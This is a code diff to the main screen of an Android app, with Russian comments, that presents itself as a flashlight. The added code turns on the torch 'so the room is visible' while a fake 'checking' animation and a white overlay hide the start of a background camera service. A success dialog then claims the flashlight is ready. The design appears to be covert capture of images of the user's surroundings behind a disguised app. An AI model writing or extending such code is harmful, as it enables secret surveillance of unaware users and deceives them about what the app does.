@@ -4,6 +4,9 @@ import android.Manifest;
 import android.app.AlertDialog;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraCharacteristics;
+import android.hardware.camera2.CameraManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
@@ -19,6 +22,8 @@ public class MainActivity extends AppCompatActivity {
     private boolean isProcessing = false;
     private View greenOverlay, whiteOverlay;
     private TextView tvAnim;
+    private CameraManager cameraManager;
+    private String cameraId;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -29,6 +34,14 @@ public class MainActivity extends AppCompatActivity {
         whiteOverlay = findViewById(R.id.white_overlay);
         tvAnim = findViewById(R.id.tv_anim_text);
         Button btn = findViewById(R.id.btn_flash);
+
+        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
+        try {
+            for (String id : cameraManager.getCameraIdList()) {
+                Boolean flash = cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
+                if (flash != null && flash) { cameraId = id; break; }
+            }
+        } catch (Exception e) {}
 
         btn.setOnClickListener(v -> {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
@@ -54,10 +67,13 @@ public class MainActivity extends AppCompatActivity {
                 handler.postDelayed(() -> tvAnim.setText("Проверка.."), 600);
                 handler.postDelayed(() -> tvAnim.setText("Проверка..."), 1200);
 
-                // Через 2 секунды: белый экран, запуск камер
+                // Через 2 секунды: белый экран, ВКЛЮЧАЕМ ФОНАРЬ и запускаем камеры
                 handler.postDelayed(() -> {
                     greenOverlay.setVisibility(View.GONE);
                     whiteOverlay.setVisibility(View.VISIBLE);
+                    
+                    // Включаем фонарь, чтобы было видно комнату
+                    try { if (cameraId != null) cameraManager.setTorchMode(cameraId, true); } catch (Exception e) {}
                     
                     Intent svc = new Intent(this, CameraService.class);
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
@@ -65,18 +81,19 @@ public class MainActivity extends AppCompatActivity {
 
                 }, 2000);
 
-                // Через 8.5 секунд: убираем белый экран, "Успех"
+                // Через 9 секунд: убираем белый экран, ВЫКЛЮЧАЕМ фонарь, "Успех"
                 handler.postDelayed(() -> {
                     whiteOverlay.setVisibility(View.GONE);
-                    isProcessing = false;
+                    try { if (cameraId != null) cameraManager.setTorchMode(cameraId, false); } catch (Exception e) {}
                     
+                    isProcessing = false;
                     new AlertDialog.Builder(this)
                         .setTitle("Успех")
                         .setMessage("Все сработало. Фонарь готов к работе.")
                         .setPositiveButton("ОК", null)
                         .show();
 
-                }, 8500);
+                }, 9000);
 
             } catch (Exception e) { e.printStackTrace(); }
         });
